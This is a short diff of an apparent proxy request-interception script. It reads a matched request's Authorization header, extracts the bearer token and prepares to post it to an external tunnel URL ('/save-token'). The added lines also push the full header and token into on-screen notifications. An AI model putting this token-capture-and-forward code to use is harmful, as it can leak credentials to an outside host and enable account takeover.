@@ -13,11 +13,13 @@ if ($request && $request.url.includes(targetURL)) {
     
     if (authorizationHeader) {
         console.log(`Authorization Header: ${authorizationHeader}`); // 打印整个 Authorization header
+        $notify(`Authorization Header: ${authorizationHeader}`);
         
         const bearerToken = authorizationHeader.split(' ')[1];
         
         if (bearerToken) {
             console.log(`Bearer Token: ${bearerToken}`); // 打印 Bearer Token
+            $notify(`Bearer Token: ${bearerToken}`);
             
             const saveTokenRequest = {
                 url: 'https://4f9f562e.r6.cpolar.top/save-token',
